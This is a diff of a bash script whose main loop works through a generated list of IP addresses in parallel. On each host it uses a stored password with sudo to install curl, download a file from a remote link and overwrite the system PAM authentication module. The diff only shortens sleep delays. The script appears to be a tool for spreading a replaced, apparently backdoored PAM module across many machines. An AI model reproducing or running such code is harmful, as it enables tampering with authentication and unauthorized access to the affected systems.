@@ -27,7 +27,6 @@ main() {
     curl -o "$path_to_tmp_pam" "$link_to_pam"
     create_IPs
     sleep 5
-
     job_count=0
     for IP in "${IPs[@]}"; do
         {
@@ -39,24 +38,21 @@ main() {
                     echo \"$password\" | sudo -S yum install -y curl || \
                     echo \"$password\" | sudo -S zypper install -y curl || \
                     echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \        
-                    sleep 10 && \
+                    sleep 5 && \
                     echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
-                    sleep 10 && \
+                    sleep 5 && \
                     echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
                 " && \
                 echo "SUCCESS (CURL): $IP" || \
                 echo "FAIL    (CURL): $IP"
             }
         } &
-
         ((job_count++))
-
         if ((job_count >= max_jobs)); then
             wait -n
             ((job_count--))
         fi
     done
-    
     wait
 }
 
